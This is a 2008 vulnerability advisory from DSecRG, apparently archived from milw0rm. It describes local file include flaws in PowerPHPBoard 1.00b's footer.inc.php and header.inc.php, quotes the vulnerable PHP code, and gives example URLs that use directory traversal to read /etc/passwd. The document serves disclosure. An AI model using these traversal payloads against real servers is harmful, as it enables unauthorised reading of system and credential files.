@@ -1,0 +1,102 @@
+[DSECRG-08-021] Digital Security Research Group [DSecRG] Advisory
+
+
+Application:                    PowerPHPBoard
+Versions Affected:              1.00b
+Vendor URL:                     http://www.powerscripts.org/
+Bug:                            Multiple Local File Include
+Exploits:                       YES
+Reported:                       01.02.2008
+Vendor Response:                none
+Solution:                       none
+Date of Public Advisory:        24.03.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+PowerPHPBoard has Multiple Local File Include vulnerabilities.
+
+
+1. Local File Include vulnerability found in script footer.inc.php
+
+To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.
+
+
+Code
+****
+#################################################
+
+   if ($settings[footer]) {
+    if (file_exists("inc/$settings[footer]")) {
+      include("inc/$settings[footer]");
+    } else {
+      echo "<center>$lang_footerdoesntexists</center>";
+    }
+  } else {
+    include("inc/footer.ppb");
+  }
+
+#################################################
+
+
+Example:
+
+http://[server]/[installdir]/footer.inc.php?settings[footer]=../../../../../../../../../../../../../etc/passwd
+
+---------------------------------------------------------------------
+
+
+2. Local File Include vulnerability found in script footer.inc.php
+
+To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.
+
+
+Code
+****
+#################################################
+
+  if (!$handler) {
+    if ($handler = @mysql_pconnect($mysql[server], $mysql[user], $mysql[password])) {
+    ...
+    }
+  }
+
+...
+
+  $query = "SELECT * FROM ppb_config WHERE id='1'";
+  $result = mysql_query($query,$handler);
+  $num = mysql_num_rows($result);
+
+  if ($num != 0) {
+    list($settings[id], $settings[boardtitle], $settings[boardurl], $settings[adminemail], $settings[header], $settings[footer], $settings[bordercolor], $settings[tablebg1], $settings[tablebg2], $settings[tablebg3], $settings[htmlcode], $settings[bbcode], $settings[smilies], $settings[newthread], $settings[newpost], $settings[language]) = mysql_fetch_array($result);
+  }
+
+...
+
+  if ($settings[header]) {
+    if (file_exists("inc/$settings[header]")) {
+      include("inc/$settings[header]");
+    } else {
+      echo "<center>$lang_headerfiledoesntexists</center>";
+    }
+  } else {
+    include("inc/header.ppb");
+  }
+
+#################################################
+
+
+Example:
+
+http://[server]/[installdir]/header.inc.php?handler=1234&settings[header]=../../../../../../../../../../../../../etc/passwd
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+# milw0rm.com [2008-03-24]
